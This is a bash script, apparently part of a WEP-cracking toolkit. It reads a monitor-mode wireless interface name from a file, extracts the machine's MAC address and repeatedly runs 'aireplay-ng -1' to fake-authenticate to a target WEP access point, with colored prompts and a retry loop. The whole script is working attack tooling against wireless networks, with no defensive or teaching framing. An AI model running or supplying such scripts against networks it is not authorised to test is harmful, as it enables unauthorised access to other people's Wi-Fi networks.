#! /bin/bash
#############DEFAULTS###############
#setting yellow-start 
YS="\e[1;33m"
#setting color-end
CE="\e[0m"
#setting red-start
RS="\e[1;31m"
#setting frequent stings
YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
PAKT="Press "$YS"any key$CE to"
PAKTC="Press "$YS"any key$CE to continue..."
PAKTGB="Press "$YS"any key$CE to go back..."

####################################
printf '\033]2;FAKEAUTH\a'
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
echo -e "Press \e[1;33many key\e[0m to start fake authentication..."
read
while true
do
	echo -e "--------------------"$RS"Fake authentication"$CE"----------------------"
	if [[ "$FIRST" = "1" ]]
	then
		aireplay-ng -1 0 -a $WEPB -h $MYMAC $WLANNM
	else
		echo -e "Getting you MAC...."
		sleep 1
		MYMAC=$(ifconfig $WLANNM | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
		echo -e "Your MAC is $MYMAC"
		sleep 1
		echo -e "Starting fake-authentication..."
		sleep 1
		FIRST="1"
		aireplay-ng -1 0 -a $WEPB -h $MYMAC $WLANNM
	fi
	echo -e "Re-fakeauth again?"$YNYES": "
	read REF
	if [[ "$REF" = "n" ]]
	then
		exit
	else
		clear
		continue
	fi
done
